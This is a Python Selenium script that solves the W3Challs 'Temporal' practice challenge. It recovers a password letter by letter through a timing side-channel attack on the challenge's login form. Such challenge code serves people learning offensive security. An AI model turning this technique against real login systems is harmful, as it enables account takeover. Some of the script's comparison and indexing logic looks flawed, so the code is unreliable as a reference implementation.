from selenium import webdriver
import string
import re
import time as t


def FindPassword(driver):
    '''
    Function to find password for W3Challs Temporal challenge.

    Brute force method of testing each letter and if the time between page loads increases, we found the character.

    Prints the password to the screen.
    '''

    driver.get("http://temporal.hacking.w3challs.com/administration.php")


    initpw = list("initulipe")
    inputElement = driver.find_elements_by_name("your_password")
    inputElement[0].send_keys("".join(initpw))
    inputElement[0].submit()
    startind = re.search(r'\b(en)\b', driver.page_source)
    endind = driver.page_source.index("ms")
    initime = int(driver.page_source[startind.start() + 2:endind].strip())


    pw = ""

    ind = 0

    while ind < len(initpw):
        for letter in list(string.ascii_lowercase):
            initpw[ind] = letter
            inputElement = driver.find_elements_by_name("your_password")
            inputElement[0].send_keys("".join(initpw))
            inputElement[0].submit()

            endind = driver.page_source.index("ms")

            time = int(driver.page_source[startind.start() + 2:endind].strip())

            if time > initime + 100:
                pw += letter
                if time > initime > 160:
                    ind += 1
                initime = time

                break

        ind += 1

    print(pw)


def main():
    driver = webdriver.Chrome()
    FindPassword(driver)

if __name__ == '__main__':
    main()
